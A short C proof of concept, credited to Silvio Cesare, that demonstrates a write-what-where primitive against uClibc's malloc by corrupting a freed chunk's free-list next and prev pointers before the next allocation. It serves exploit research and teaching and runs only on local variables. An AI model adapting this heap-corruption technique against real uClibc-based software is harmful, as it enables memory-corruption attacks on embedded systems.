// Dr Silvio Cesare

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

//#include "uclibc_malloc.h"

struct heap_free_area {
  size_t size;
  struct heap_free_area *next, *prev;
};

long *real_target;
long foo;

static volatile int xx;

int main() {

  char *p = uclibc_malloc(10);
  char *q = uclibc_malloc(10);

  // Insert into free list
  uclibc_free(p);

  real_target = NULL;
  foo = 0x41414141424242;

  struct heap_free_area * fa1 = (void *) (p - 8);
  fa1->prev = (void *) &foo; // What
  fa1->next = (void *) (&real_target - 2); // Where

  q = uclibc_malloc(10); // write-what-where

  if (real_target) {
    printf("%lx\n", *real_target);
  }
}